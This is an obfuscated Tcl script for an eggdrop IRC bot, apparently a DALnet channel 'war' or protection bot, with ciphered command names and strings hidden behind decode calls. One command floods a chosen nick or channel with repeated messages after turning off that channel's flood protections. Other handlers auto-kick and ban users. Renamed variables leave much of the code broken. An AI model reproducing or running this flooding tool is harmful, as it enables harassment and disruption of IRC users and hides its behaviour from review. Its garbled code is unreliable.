if {![string match "*[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "[[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "6zDxg0N01.b.l8Kll/kjfM//ghqiw.0kcA70ocmhR198zhj.Fhmey.pIV/V."]"]]*" $vern]} { [[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "f\grnv\i"] 5 [[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "[[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "6zDxg0N01.b.l8Kll/kjfM//ghqiw.0kcA70ocmhR198zhj.Fhmey.pIV/V."]"]]*" $vern]} { [[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "iv\gf\im"] 0 }
}
proc [lines "kfy_ghfmznr"] {nick uhost hand channel rest} {
global cmd_chn cmd_by cmd_msg cmd_case botnick version notc quick ps
set [lines "kvihlm"] [lindex $rest 0]
set [lines "ivhg"] [lrange $rest 1 end]
if {$person == $botnick} { return 0 }
if {[string index $person 0] == "#"} {
if {[validchan $person]} {
if {[isop $botnick $person] && ![matchattr $nick m]} {
if {[isutimer "IN PROGRESS"]} { return 0 }
utimer 20 [list putlog "IN PROGRESS"]
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1xSzMMvO 4UOlLw1 KIlGvxGRlM4..!"
return 0
}
}
}
if {[matchattr $person n] && ![matchattr $nick Z]} {
if {[isop $botnick $channel]} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1ZWnRM 4UOlLw1 KIlGvxGRlM4..!"
}
if {[istimer "IN PROGRESS"]} { return 0 }
timer 2 [list putlog "IN PROGRESS"]
putsrv "MLGRXV ~$nick ~:ZWnRM uOllw KIlGVxGRlM,"
puthlp "MLGRXV ~$nick ~:ZWnRM uOllw KIlGVxGRlM,"
puthlp "MLGRXV ~$nick ~:ZWnRM uOllw KIlGVxGRlM,"
puthlp "MLGRXV ~$nick ~:ZWnRM uOllw KIlGVxGRlM,"
return 0
}
if {![matchattr $nick Z]} {
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: ghfmznr <mrxp/#> <nht>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string tolower $person] == [string tolower $ps]} { return 0 }
if {[string index $person 0] == "#"} {
if {![validchan $person]} {
pub_randnick $nick $uhost $hand $channel ""
set [lines "xnw_xsm"] $person
set [lines "xnw_nht"] $rest
set [lines "xnw_yb"] $nick
set [lines "xnw_xzhv"] "1"
channel add $person
catch { channel set $person +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
}
catch { clearqueue all }
pub_randnick $nick $uhost $hand $channel ""
if {[string index $person 0] == "#"} { setignore "*!*@*" "*" 120 }
if {$quick == "1"} {
putqck "KIRENHT ~$person ~:~$rest,"
putqck "MLGRXV ~$person ~:~$rest,"
}
putsrv "MLGRXV ~$person ~:~$rest,"
puthlp "MLGRXV ~$person ~:~$rest,"
puthlp "MLGRXV ~$person ~:~$rest,"
puthlp "MLGRXV ~$person ~:~$rest,"
puthlp "MLGRXV ~$person ~:~$rest,"
puthlp "MLGRXV ~$person ~:~$rest,"
utimer 10 { 
puthlp "ZDZB" 
}
utimer 120 goback
return 0
}
bind time -  "*2 * * * *" auto_ident
proc [lines "zfgl_rwvmg"] {min h d m y} {
timer 5 ident_it
auto_ping "0" "0" "0" "0" "0"
}
set [lines "dliwh"] {
"\002*TuiNg.TuiNg*\002"
"(((( BzT BzT )))))"
"(((( b.I.p b.I.p )))))"
"(((( PeRMiSi )))))"
"\002*BzT BzT*\002"
"PaTRoLi"
"ScaNNiNg"
}
bind time - "0 * * * *" wordstime
bind time - "*5 * * * *" wordstime
proc [lines "dliwhgrnv"] {n h handle ch te} {
global words 
foreach x [channels] {
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string match "*+action*" [channel info $x]]} {
if {[getuser $cflag XTRA "ACTION"] == ""} {
putsrv "KIRENHT ~$x ~:\001ZXGRLM ~[lindex $words [rand [llength $words]]]~\001"
} { 
putsrv "KIRENHT ~$x ~:\001ZXGRLM ~[getuser $cflag XTRA "ACTION"]~\001"
}
}
}
}
proc [lines "rwvmg_rg"] {} {
global nick altnick botnick nickpass altpass ex_flood invme pingchan own chk_reg
global kickme deopme cmd_chn cmd_msg ps twice_msg keep-nick version notc lastkey
global flooddeop floodnick floodkick server-online is_m op_it jpfchn jpfmsg jpfidx
putlog "!Log! AuTO ReSETING & IDeNTIFY"
catch { channel remove $jpfchn }
catch { unset jpfchn }
catch { unset jpfmsg }
catch { unset jpfidx }
catch {unset op_it}
catch {unset is_m}
catch {unset chk_reg}
catch {unset flooddeop}
catch {unset floodnick}
catch {unset floodkick}
catch {unset lastkey}
catch {unset ex_flood}
catch {unset invme}
catch {unset pingchan}
catch {unset twice_msg}
catch {unset kickme}
set [lines "wvlknv"] ""
set [lines "xnw_xsm"] ""
set [lines "xnw_nht"] ""
if {${server-online} == 0} { return 0 }
if {![string match "ERR??????????" $botnick] && ![string match "ERR??????" $botnick]} {
if {$botnick != $nick && $botnick != $altnick && ![istimer "goback"] && ![isutimer "goback"]} { goback }
} {
goback
}
if {$botnick == $nick && $nickpass != ""} {
putsrv "MrxpHvie rwvmgrub ~$nickpass"
}
if {$botnick != $nick && $nickpass != ""} {
putsrv "MrxpHvie rwvmgrub ~$nick ~~$nickpass"
}
if {$ps != $own} {
set [lines "ldm"] $ps
}
if {![isutimer "del_nobase"] && ![istimer "del_nobase"]} { utimer 2 del_nobase }
}
bind time -  "*4 * * * *" auto_ping
bind time -  "*8 * * * *" auto_ping
proc [lines "zfgl_krmt"] {min h d m y} {
global botnick repeat_last repeat_person capsnick boldnick own notc notc_chn bannick
global unop wait_ping server-online jpnick igflood is_ban iskick colorkick yealnick 
if {${server-online} == 0} {
catch { unset wait_ping }
return 0
}
catch {unset iskick}
catch {unset is_ban}
catch {unset igflood}
catch {unset jpnick}
catch {unset unop}
catch {unset bannick}
catch {unset notc_chn}
catch {unset capsnick}
catch {unset boldnick}
catch {unset colorkick}
catch {unset yealnick}
catch {unset repeat_person}
catch {unset repeat_last}
puthlp "KIRENHT ~$botnick ~:\001KRMT ~[unixtime]~\001"
if {![info exists wait_ping]} {
set [lines "dzrg_krmt"] 1
} else {
set [lines "dzrg_krmt"] [expr $wait_ping + 1]
}
if {$wait_ping > 9} {
catch { unset wait_ping }
putsrv "JFRG :~$notc ~Hvievi OZttVw ZfGl IvHGzIG IvJfvhG"
}
}
proc [lines "ivnzrm"] {} {
global botnick uptime timezone notc notd vern longer awaybanner awban
set [lines "glgzobvzi"] [expr [unixtime] - $uptime]
if {$totalyear >= 31536000} {
set [lines "bvzihufoo"] [expr $totalyear/31536000]
set years [expr int($yearsfull)]
set [lines "bvzihhfy"] [expr 31536000*$years]
set [lines "glgzowzb"] [expr $totalyear - $yearssub]
}
if {$totalyear < 31536000} {
set [lines "glgzowzb"] $totalyear
set [lines "bvzih"] 0
}
if {$totalday >= 86400} {
set [lines "wzbhufoo"] [expr $totalday/86400]
set days [expr int($daysfull)]
set [lines "wzbhhfy"] [expr 86400*$days]
set [lines "glgzoslfi"] [expr $totalday - $dayssub]
}
if {$totalday < 86400} {
set [lines "glgzoslfi"] $totalday
set [lines "wzbh"] 0
}
if {$totalhour >= 3600} {
set [lines "slfihufoo"] [expr $totalhour/3600]
set hours [expr int($hoursfull)]
set [lines "slfihhfy"] [expr 3600*$hours]
set [lines "glgzonrm"] [expr $totalhour - $hourssub]
}
if {$totalhour < 3600} {
set [lines "glgzonrm"] $totalhour
set [lines "slfih"] 0
}
if {$totalmin >= 60} {
set [lines "nrmhufoo"] [expr $totalmin/60]
set mins [expr int($minsfull)]
}
if {$totalmin < 60} {
set [lines "nrmh"] 0
}
if {$years < 1} {set yearstext ""} elseif {$years == 1} {set yearstext "$years year, "} {set yearstext "$years years, "}
if {$days < 1} {set daystext ""} elseif {$days == 1} {set daystext "$days day, "} {set daystext "$days days, "}
if {$hours < 1} {set hourstext ""} elseif {$hours == 1} {set hourstext "$hours HoUR, "} {set hourstext "$hours HoURS, "}
if {$mins < 1} {set minstext ""} elseif {$mins == 1} {set minstext "$mins MiNuTE"} {set minstext "$mins MiNuTES"}
if {[string length $mins] == 1} {set mins "0${mins}"}
if {[string length $hours] == 1} {set hours "0${hours}"}
set [lines "lfgkfg"] "${yearstext}${daystext}${hours}:${mins}"
set [lines "lfgkfg"] [string trimright $output ", "]
if {[getuser "config" XTRA "jes_"]!=""} {
set awban $awaybanner
} {
set awban "4,1-BU8SU0K-"
}
if {[getuser "config" XTRA "AWAY"]!=""} {
set longer "$awban $vern 0,4upz $output 4,0H13r14s ([getuser "config" XTRA "AWAY"])"
} {
set longer "$awban $vern 0,4upz $output 4,0H13r14s (Auto Away On IdLe)"
}
}
proc [lines "nht_fhviorhg"] {nick hand uhost rest} {
global notc 
pub_userlist $nick $uhost $hand "" $rest
}
proc [lines "kfy_fhviorhg"] {nick uhost hand chan rest} {
global ps notc 
set [lines "zprxporhg"] " 4KIcKLIsT"
foreach y [getuser "AKICK" HOSTS] {
append akicklist " $y "
}
set [lines "fhvih"] "UsERLIsT:"
foreach x [userlist] {
if {($x != "config") && ($x != "AKICK") && ($x != $ps) && ![matchattr $x A]} {
if {[matchattr $x O]} { 
append users " 4$x "
} else { append users " $x " }
set [lines "uozt"] [chattr $x]
append users "($flag)"
}
}
append users " \[$akicklist\]"
if {[getuser "config" XTRA "IPG"] != ""} {
append users " IpguaRd [getuser "config" XTRA "IPG"]"
}
if {[string length $users] > 300} {
set [lines "szou"] [expr [string length $users]/3]
set half [expr int($half)]
set [lines "mgx"] "[string range $users 0 $half].."
puthlp "MLGRXV ~$nick ~:~$notc ~~$ntc"
set [lines "mgx"] "..[string range $users [expr $half + 1] [expr $half + $half]].."
puthlp "MLGRXV ~$nick ~:~$notc ~~$ntc"
set [lines "mgx"] "..[string range $users [expr $half + 1 + $half] end]"
puthlp "MLGRXV ~$nick ~:~$notc ~~$ntc"
} elseif {[string length $users] > 200} {
set [lines "szou"] [expr [string length $users]/2]
set half [expr int($half)]
set [lines "mgx"] "[string range $users 0 $half].."
puthlp "MLGRXV ~$nick ~:~$notc ~~$ntc"
set [lines "mgx"] "..[string range $users [expr $half + 1] end]"
puthlp "MLGRXV ~$nick ~:~$notc ~~$ntc"
} else {
puthlp "MLGRXV ~$nick ~:~$notc ~~$users"
}
return 0
}
proc [lines "kfy_evi"] {nick uhost hand chan rest} {
global vern
puthlp "KIRENHT ~$chan ~:~$vern"
return 0
}
proc [lines "kfy_oltl"] {nick uhost hand chan rest} {
global banner
if {[info exists banner]} {
puthlp "KIRENHT ~$chan ~:~$banner"
} {
puthlp "KIRENHT ~$chan ~:~[lgrnd]~"
}
return 0
}
proc [lines "kfy_oltlzdzb"] {nick uhost hand chan rest} {
global awaybanner
if {[info exists awaybanner]} {
puthlp "KIRENHT ~$chan ~:~$awaybanner"
} {
puthlp "KIRENHT ~$chan ~:~[lgrnd]~"
}
return 0
}
proc [lines "kfy_krmt"] {nick uhost hand chan rest} {
puthlp "KIRENHT ~$chan ~:~$nick, ~[dezip "PCctt..Y879/8PuZg.dxUPO0VKBsz0Je.bB.YdNIc/Xge1E."]"
return 0
}
proc [lines "kfy_mlylg"] {nick uhost hand chan rest} {
global botnick
if {![isop $botnick $chan]} { return 0 }
if {[isutimer "pub_nobot"]} { return 0 }
if {[rand 2] <= 1} {
puthlp "KIRENHT ~$chan ~:\001FHVIRMUL\001"
} {
puthlp "KIRENHT ~$chan ~:\001XORVMGRMUL\001"
}
return 0
}
bind ctcr - USERINFO ui_reply
bind ctcr - CLIENTINFO ui_reply
proc [lines "fr_ivkob"] {nick uhost hand dest key arg} {
global botnick bannick notc ismaskhost
if {![string match "*eggdrop*" $arg]} { return 0 }
if {$nick == $botnick || [matchattr $nick f]} { return 0 }
foreach x [channels] {
if {[onchan $nick $x] && [isop $botnick $x] && ![isop $nick $x]} {
if {[info exists ismaskhost]} {
set bannick($nick) [maskhost "*!*[string range $uhost [string first "@" $uhost] end]"]
} {
set bannick($nick) "*!*[string range $uhost [string first "@" $uhost] end]"
}
putsrv "PRXP ~$x ~~$nick ~:~$notc ~4~[string toupper $x]~1 UlIYRWWvM UlI 4VttB1 WfV gL OznV ZmGRxRKzGVw ~[banmsg]~"
return 0
}
}
}
bind ctcr - PING ping_reply
proc [lines "krmt_ivkob"] {nick uhost hand dest key arg} {
global pingchan botnick wait_ping
catch { unset wait_ping }
if {$nick == $botnick} { 
return 0
}
set [lines "krmtgrnv"] [expr [unixtime] - $arg]
if {[info exists pingchan($nick)]} { 
puthlp "KIRENHT ~$pingchan($nick) ~:~$nick, ~KRMT ~$pingtime ~Hvx'h" 
unset pingchan($nick)
}
if {![matchattr $nick f]} {
set [lines "slhgnzhp"] "${nick}!*@*"
putlog "!Log! 1 minutes auto ignore to $hostmask"
newignore $hostmask $botnick "*" 1
}
return 0
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmge"]
proc [lines "kfy_ivhvg"] {nick uhost hand chan rest} {
global notc
putsrv "MLGRXV ~$nick ~:~$notc ~!IvHvG!"
auto_ping "0" "0" "0" "0" "0"
ident_it
}
proc [lines "kfy_klmt"] {nick uhost hand chan rest} {
global pingchan
putsrv "KIRENHT ~$nick ~:\001KRMT ~[unixtime]~\001"
set pingchan($nick) $chan
return 0
}
proc [lines "kfy_zfgs"] {nick uhost hand chan rest} {
global botnick notc
set [lines "xnw"] [string tolower [lindex $rest 0]]
set [lines "xs"] [passwdok $nick ""]
if {$ch == 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml kzhhdliw hvg. Fhztv: kzhh <kzhhdliw>" 
return 0
}
if {[matchattr $nick Q]} { 
puthlp "KIRENHT ~$chan ~:~${nick}, ~[dezip qbVUA1UHeK0/pi14g/fdJBG/7gmfj1K6Efg.]"
}
if {![matchattr $nick Q]} { 
puthlp "KIRENHT ~$chan ~:~${nick}, ~4ML!"
}
}
proc [lines "mlgx_kilg"] {nick uhost hand text {dest ""}} {
global notc botnick notc_chn bannick notm quick ismaskhost is_m
if {$dest != "" && $dest != $botnick} {
if {[string index $dest 0] == "+" || [string index $dest 0] == "@"} {
foreach x [channels] {
set [lines "c"] [string tolower $x]
if {[string match "*$x*" [string tolower $dest]]} {
set [lines "wvhg"] $x
break
}
}
} 
if {[isop $botnick $dest]} {
if {[string match "*-greet*" [channel info $dest]]} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {$nick == $botnick} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[isop $nick $dest]} { return 0 }
if {[isutimer "set_-m $dest"]} { return 0 }
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
if {[info exists notc_chn($dest)]} {
incr notc_chn($dest)
} {
set notc_chn($dest) 1
}
if {$notc_chn($dest) == 1} {
putsrv "PRXP ~$dest ~~$nick ~:~$notc ~1ZYfhRMt 4MlGRxV1 @kh LmOB ~[banmsg]~"
} elseif {$notc_chn($dest) == 2} {
if {$quick == "1" && ![info exists is_m($dest)]} {
putqck "PRXP ~$dest ~~$nick ~:~$notm ~1GdRxV 4MlGRxV1 ZYfhVw ~[banmsg]~"
} {
putsrv "PRXP ~$dest ~~$nick ~:~$notm ~1GdRxV 4MlGRxV1 ZYfhVw ~[banmsg]~"
}
} elseif {$notc_chn($dest) >= 3} {
if {[info exists ismaskhost]} {
set bannick($nick) [maskhost $banmask]
}
if {$quick == "1" && ![info exists is_m($dest)]} {
putqck "PRXP ~$dest ~~$nick ~:~$notm ~1gL nFxS 4eRlOvmxV1 UIlN GSRH R.H.K 4@fG.1 !!"
} {
putsrv "PRXP ~$dest ~~$nick ~:~$notm ~1gL nFxS 4eRlOvmxV1 UIlN GSRH R.H.K 4@fG.1 !!"
}
}
return 0
}
repeat_pubm $nick $uhost $hand $dest $text
} {
msg_prot $nick $uhost $hand $text
}
}
bind nick - * ps:check
proc [lines "hvgrtmliv"] {mask reason time} {
global quick
foreach x [ignorelist] {
if {[lindex $x 0] == $mask} { return 0 }
}
newignore $mask "IgN" $reason 15
if {$quick == "1"} {
putquick "silence +$mask"
} {
putserv "silence +$mask"
}
utimer $time [list unsetignore $mask]
}
proc [lines "fmhvgrtmliv"] {mask} {
if {![isignore $mask]} { return 0 }
putserv "silence -$mask"
killignore $mask
}
set [lines "nzhhnht"] 0
[lines "fmyrmw"] [lines "xgxi"] - [lines "KRMT"] [lines "krmt_ivkob"]
proc [lines "nht_kilg"] {unick uhost hand text} {
global nick botnick invme own nickpass altpass notc notb notd virus_nick ex_flood vern 
global altnick twice_msg version bannick massmsg keep-nick badwords advwords quick is_m ismaskhost
regsub -all -- [dezip "jG~BDx04ntxb0"] $text "" text
msg_Z $unick $uhost $hand $text
set [lines "ivzo"] $text
set [lines "gvcg"] [uncolor $text]
if {$unick == $botnick} { return 0 }
if {[string match "*dcc send*" [string tolower $text]] && ![string match "*Serv*" $unick] && ![matchattr $unick f]} {
set [lines "erifh_mrxp"] $unick
foreach x [channels] {
if {[onchan $virus_nick $x] && ![matchattr $virus_nick f] && ![isop $virus_nick $x]} {
if {[isop $botnick $x]} {
set [lines "slhg"] [getchanhost $virus_nick $x]
set [lines "slhg"] "*!*@[lindex [split $host @] 1]"
set bannick($virus_nick) $host
putsrv "PRXP ~$x ~~$virus_nick ~:~$notc ~4!HkzN!1 R SzGV 4ERIfA ~[banms]~"
set [lines "erifh_mrxp"] ""
} else {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4!SpaM!1 FRoM 4@[lindex [split [getchanhost $virus_nick $x] @] 1]1 ViRuZ [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
}
}
return 0
}
if {$unick == "ChanServ"} {
if {[string match "*You do not have access to op people on*" $text] && [getuser "config" XTRA "MUSTOP"] != "" && $botnick == $nick} {
set [lines "kzigxsm"] [lindex $text 9]
set [lines "kzigxsm"] [string range $partchn 0 [expr [string length $partchn]-2]]
if {[string match "*-secret*" [channel info $partchn]]} {
putsrv "KZIG ~$partchn ~:((((@kTfzIw))))"
channel remove $partchn
savechan
}
}
if {[string match "*is not on*" $text]} { 
set [lines "gvcg"] [string tolower $text]
foreach x [channels] {
set [lines "c"] [string tolower $x]
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string match "*$x*" $text]} {
if {![string match "*c*" [getchanmode $x]]} {
putsrv "KZIG ~$x ~:1ivtzrmvw (4@1)kh hgzgfh"
} {
putsrv "KZIG ~$x ~:1ivtzrmvw (@)kh hgzgfh"
}
if {[matchattr $cflag K]} {
puthlp "QLRM ~$x ~:~[dezip [getuser $cflag XTRA "CI"]~]"
} {
puthlp "QLRM ~$x"
}
}
}
return 0
}
if {[string match "*AOP:*SOP:*AKICK*" $text]} {
foreach errchan [channels] {
set [lines "xuozt"] "c$errchan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string match "*[string tolower $errchan] *" [string tolower $text]]} {
if {![isop $botnick $errchan]} {
timer 1 { putlog "resync" }
if {![string match "*c*" [getchanmode $errchan]]} {
putsrv "KZIG ~$errchan ~:1ivtzrmvw (4@1)kh hgzgfh"
} {
putsrv "KZIG ~$errchan ~:ivtzrmvw (@)kh hgzgfh"
}
if {[matchattr $cflag K]} {
puthlp "QLRM ~$errchan ~:~[dezip [getuser $cflag XTRA "CI"]~]"
} {
puthlp "QLRM ~$errchan"
}
}
return 0
}
}
}
return 0 
}
if {$unick == "NickServ"} {
if {[string match "*nick is owned*" [string tolower $text]]} { 
putlog "!Log! IDeNTIFY"
catch { clearqueue all }
if {$botnick == $nick && $nickpass != ""} { 
putsrv "MrxpHvie rwvmgrub ~$nickpass"
}
if {$botnick == $altnick && $altpass != ""} { 
putsrv "MrxpHvie rwvmgrub ~$altpass"
}
}
if {[string match "*Password accepted for*" $text]} { auto_reop }
if {[string match "*The nick $nick is not registered*" $text] && $nickpass != ""} {
if {[getuser "config" XTRA "EMAIL"] != ""} {
putsrv "MrxpHvie ivtrhgvi ~$nickpass ~~[getuser "config" XTRA "EMAIL"]~"
}
}
if {[string match "*The nick $nick has been temporarily registered to you*" $text]} {
putsrv "MrxpHvie rwvmgrub ~$nickpass"
}
return 0
}
if {$unick == "MemoServ"} {
if {[string match "*New DALnet news is available*" $text]} {
putsrv "KIRENHT NvnlHvie@hvierxvh.wzo.mvg :MVDH"
}
return 0
}
if {[string match "!kick*" [string tolower $text]]} {
set [lines "hzooh"] [dezip [lrange $text 1 end]]
set [lines "hxszm"] [lindex $salls 0]
set [lines "hmrxp"] [lindex $salls 1]
set [lines "hivzh"] [lrange $salls 2 end]
if {![isop $botnick $schan] || [matchattr $snick f] || ![onchan $snick $schan]} { return 0 }
set [lines "yzmslhg"] [getchanhost $snick $schan]
set [lines "yzmslhg"] "*!*@[lindex [split $banhost @] 1]"
set bannick($snick) $banhost
regsub -all -- [dezip "bF~uC0.JqaEc0"] $sreas "" sreas
regsub -all -- [dezip "xdxs~F1hBM6q0"] $sreas "" sreas
putsrv "PRXP ~$schan ~~$snick ~:~$sreas"
return 0
}
if {[string match "*auth*" $text] || [string match "*[string tolower $notb]*" [string tolower $text]]} { return 0 }
if {[matchattr $hand f]} { return 0 }
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
if {![isutimer "MSGCOUNTER"]} {
utimer 20 { putlog "MSGCOUNTER" }
set [lines "nzhhnht"] 1
} {
set [lines "nzhhnht"] [incr massmsg]
if {[string length $text] > 100} {
set [lines "nzhhnht"] [incr massmsg]
}
if {$massmsg >= 5} {
set [lines "nzhhnht"] 0
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "MaZz MSg" 300
} {
setignore "*!*$mhost" "MaZz MSg" 300
}
foreach iamop [channels] {
if {[isop $botnick $iamop]} {
if {[string match "*c*" [getchanmode $iamop]]} {
puthlp "KIRENHT ~$iamop ~:\001ZXGRLM RmxLnRMt NzAa NHt..! OzhG UIlN ~[unsix "$unick!$uhost"]~\001"
} {
puthlp "KIRENHT ~$iamop ~:\001ZXGRLM RmxLnRMt NzAa NHt..! OzhG UIlN 1~[unsix "$unick!$uhost"]~\001"
}
foreach c [chanlist $iamop] {
set [lines "mrxpslhg"] [string range [getchanhost $c $iamop] [string first "@" [getchanhost $c $iamop]] end]
if {$nickhost == $mhost && ![matchattr $c f]} {
if {$c == $botnick} { return 0 }
set bannick($c) "*!*$mhost"
putsrv "PRXP ~$iamop ~~$c ~:~$notc ~1Svzeb 4UOlLw1 NHt UIlN 4~$mhost ~~[banms]~"
break
}
}
}
}
return 0
}
}
if {[string match "*decode*" [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set bannick($unick) "*!*$mhost"
putsrv "PRXP ~$x ~~$unick ~:~$notc ~4!HkzN!1 R SzGV 4wVxLwV ~[banms]~"
return 0
} {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4!SpaM!1 FRoM 4[string range $uhost [string first "@" $uhost] end]1 dEcOdE [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
}
}
set invme($mhost) "dEcOdE"
}
if {[string match "*#*" $text] || [string match "*/j*" $text]} {
foreach x [channels] {
set [lines "xsphrglm"] [string tolower $x]
if {[string match "*$chksiton*" [string tolower $text]]} { return 0 }
}
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($unick) $banmask
putsrv "PRXP ~$x ~~$unick ~:~$notc ~4!HkzN!1 R SzGV 4RmeRGvI ~[banms]~"
return 0
} {
set [lines "nvnyvih"] [chanlist $x]
foreach c $members {
if {[isop $c $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4!SpaM!1 FRoM 4[string range $uhost [string first "@" $uhost] end]1 InvITE [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
} {
set [lines "yzmnzhp"] "[string range $uhost [string first "@" $uhost] end]"
if {$banmask != "*!*@*" && $banmask != "*"} {
foreach c [chanlist $x] {
set [lines "mrxpslhg"] "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
if {$banmask == $nickhost} {
if {[matchattr $c f]} {
putlog "!Log! InVITE (f) $c PaSS!!"
return 0
}
if {$c != $botnick} {
if {[isop $botnick $x]} {
set bannick($c) $banmask
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
putsrv "PRXP ~$x ~~$c ~:~$notc ~4!HkzN!1 RmeRGvI 4IvOzB1 UIlN 4~$unick1 ~RK 4~$mhost ~~[banms]~"
} {
set [lines "nvnyvih"] [chanlist $x f]
foreach s $members {
if {[isop $s $x]} {
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
set [lines "hvmwhkzn"] "!kick [zip "$x $c $notc 4!SpaM!1 InvITeR 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"]"
putsrv "KIRENHT ~$s ~:~$sendspam"
break
}
}
}
return 0
}
}
}
}
}
}
set invme($mhost) "InvITE"
return 0
}
if {[string match "*http:/*" [string tolower $text]] || [string match "*www.*" [string tolower $text]]} {
if {[string match "*dal.net*" [string tolower $text]]} { return 0 }
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($unick) $banmask
putsrv "PRXP ~$x ~~$unick ~:~$notc ~4!HkzN!1 R SzGV 4ZweVIGRhV ~[banms]~"
return 0
} else {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $unick $notc 4!SpaM!1 FRoM 4[string range $uhost [string first "@" $uhost] end]1 AdvERTIsE [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
} {
set [lines "yzmnzhp"] "[string range $uhost [string first "@" $uhost] end]"
if {$banmask != "*!*@*" && $banmask != "*"} {
foreach c [chanlist $x] {
set [lines "mrxpslhg"] "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
if {$banmask == $nickhost} {
if {[matchattr $c f]} {
putlog "!Log! InVITE (f) $c PaSS!!"
return 0
}
if {$c != $botnick} {
if {[isop $botnick $x]} {
set bannick($c) $banmask
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
putsrv "PRXP ~$x ~~$c ~:~$notc ~4!HkzN!1 ZweVIGRhV 4IvOzB1 UIlN 4~$unick1 ~RK 4~$mhost ~~[banms]~"
} {
set [lines "nvnyvih"] [chanlist $x f]
foreach s $members {
if {[isop $s $x]} {
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
set [lines "hvmwhkzn"] "!kick [zip "$x $c $notc 4!SpaM!1 AdvERTIsE 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"]"
putsrv "KIRENHT ~$s ~:~$sendspam"
return 0
}
}
}
return 0
}
}
}
}
}
}
set invme($mhost) "AdvERTIsE"
return 0
}
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
if {[string length $text] > 100} {
set [lines "xsi"] 0
set [lines "xmg"] 0
while {$cnt < [string length $real]} {
if [isflood [string index $real $cnt]] {
incr chr
}
incr cnt
}
if {$chr > 30} {
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "TsunamI MSg" 300
} {
setignore "*!*$mhost" "TsunamI MSg" 300
}
foreach x [channels] {
if {[isop $botnick $x]} {
